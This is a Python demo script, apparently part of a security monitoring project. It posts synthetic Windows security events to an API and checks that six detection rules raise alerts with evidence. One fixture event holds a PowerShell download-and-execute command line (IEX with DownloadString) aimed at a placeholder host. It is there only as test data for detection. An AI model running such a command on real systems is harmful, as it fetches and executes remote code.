"""Generate synthetic events and verify the six detection rules (Python 3.9+)."""

import argparse
import json
import os
import time
from datetime import datetime, timedelta, timezone
from uuid import UUID, uuid4, uuid5

from smoke_test import ROOT, request, require


def fixture(run_id):
    folder = ROOT / ".local" / "detection-demo"
    folder.mkdir(parents=True, exist_ok=True, mode=0o700)
    path = folder / (str(run_id) + ".json")
    if path.exists():
        return json.loads(path.read_text())
    now = datetime.now(timezone.utc)
    base = datetime.fromtimestamp(int(now.timestamp()) // 300 * 300 - 300, timezone.utc)
    events = []
    for index, second in enumerate((10, 20, 30, 40, 50, 70, 80)):
        kind = (
            "login_failure"
            if index < 5
            else "login_success"
            if index == 5
            else "security_log_cleared"
        )
        events.append(
            {
                "event_uid": str(uuid5(run_id, str(index))),
                "endpoint_id": "detection-demo-" + str(run_id),
                "hostname": "SYNTHETIC-WINDOWS",
                "os": "windows",
                "source": "Security",
                "event_type": kind,
                "event_code": 4625 if index < 5 else 4624 if index == 5 else 1102,
                "timestamp": (base + timedelta(seconds=second)).isoformat(),
                "username": "demo-user",
                "user_domain": "DEMO",
                "source_ip": "192.0.2.50",
                "message": "Synthetic detection demonstration: " + kind,
                "raw_event": {"synthetic": True, "demo_run_id": str(run_id)},
            }
        )
    additions = [
        ("account_created", 4720, {"target_username": "synthetic-account"}),
        (
            "group_membership_changed",
            4732,
            {
                "group_sid": "S-1-5-32-544",
                "group_name": "Administrators",
                "target_user_sid": "S-1-5-21-1-2-3-1010",
            },
        ),
        (
            "process_created",
            4688,
            {
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/synthetic')",
            },
        ),
    ]
    for index, (kind, code, fields) in enumerate(additions, 7):
        events.append(
            {
                **events[0],
                "event_uid": str(uuid5(run_id, str(index))),
                "event_type": kind,
                "event_code": code,
                "timestamp": (base + timedelta(seconds=90 + index)).isoformat(),
                "message": "Synthetic detection demonstration: " + kind,
                **fields,
            }
        )
    descriptor = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    with os.fdopen(descriptor, "w") as handle:
        json.dump(events, handle, indent=2)
    return events


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--run-id", type=UUID, help="Replay the exact same synthetic run without duplicating alerts"
    )
    args = parser.parse_args()
    run_id = args.run_id or uuid4()
    events = fixture(run_id)
    env = {}
    for line in (ROOT / ".env").read_text().splitlines():
        if line and not line.startswith("#") and "=" in line:
            key, value = line.split("=", 1)
            env[key] = value.strip().strip("\"'")
    collector, analyst = env["COLLECTOR_API_KEY"], env["ANALYST_API_KEY"]
    status, worker = request("GET", "/detections/status", analyst)
    require(status == 200 and worker["worker_recent"], "Start the detection worker before the demo")
    duplicates = 0
    for event in events:
        status, response = request("POST", "/events", collector, event)
        require(status in (200, 201), "Synthetic event ingestion failed")
        duplicates += response["duplicate"]
    endpoint = events[0]["endpoint_id"]
    expected = {"AUTH-BRUTE-001", "AUTH-SUCCESS-001", "WIN-LOG-CLEAR-001"}
    if len(events) > 7:
        expected.update({"WIN-ACCOUNT-001", "WIN-GROUP-001", "WIN-PS-001"})
    deadline = time.monotonic() + 30
    alerts = []
    while time.monotonic() < deadline:
        status, page = request("GET", "/alerts?endpoint_id=" + endpoint, analyst)
        require(status == 200, "Alert search failed")
        alerts = page["items"]
        if {alert["rule_id"] for alert in alerts} == expected:
            break
        time.sleep(1)
    require(
        len(alerts) == len(expected) and {alert["rule_id"] for alert in alerts} == expected,
        "Expected rule alerts within 30 seconds",
    )
    for alert in alerts:
        status, evidence = request("GET", "/alerts/" + alert["id"] + "/events", analyst)
        require(status == 200 and not evidence["missing_event_ids"], "Alert evidence missing")
        require(len(evidence["items"]) == alert["event_count"], "Incorrect evidence count")
    print(
        "PASS: all {} expected detection rules generated alerts with retrievable evidence.".format(
            len(expected)
        )
    )
    print(
        json.dumps(
            {
                "run_id": str(run_id),
                "submitted_events": len(events),
                "duplicate_events": duplicates,
                "alerts": [
                    {
                        "id": alert["id"],
                        "rule": alert["rule_id"],
                        "severity": alert["severity"],
                        "evidence_events": alert["event_count"],
                    }
                    for alert in alerts
                ],
            },
            indent=2,
        )
    )
    print("Replay with: python3 scripts/detection_demo.py --run-id " + str(run_id))


if __name__ == "__main__":
    try:
        main()
    except (OSError, ValueError, KeyError, RuntimeError) as exc:
        # Do not include request bodies, headers, or raw connection exceptions in output.
        if isinstance(exc, RuntimeError):
            raise SystemExit(str(exc)) from None
        raise SystemExit("Demo failed; check .env, API, and worker availability.") from None
